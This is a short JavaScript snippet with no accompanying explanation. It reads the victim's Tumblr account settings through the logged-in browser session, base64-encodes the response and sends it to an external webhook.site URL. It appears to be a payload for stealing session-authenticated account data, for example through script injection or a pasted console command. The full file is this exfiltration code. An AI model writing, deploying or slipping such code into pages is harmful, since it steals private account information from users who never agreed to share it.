async function getData() {
  try {
    const response = await fetch("https://www.tumblr.com/api/v2/user/settings", {
      headers: {
        "accept": "application/json;format=camelcase",
        "authorization": "Bearer aaaa", 
      },
      method: "GET",
      credentials: "include"
    });

    if (!response.ok) {
      throw new Error(`aaaaaa ${response.status}`);
    }

    const result = await response.json();
    const jsonString = JSON.stringify(result);
    const base64Data = btoa(jsonString);

    console.log("Base64:", base64Data);
    const webhookUrl = "https://webhook.site/e24b5b15-681f-477f-b84b-4386fe117c80";
    const sendResponse = await fetch(`${webhookUrl}?info=${encodeURIComponent(base64Data)}`);

    console.log(sendResponse.status);
  } catch (error) {
    console.error(error.message);
  }
}
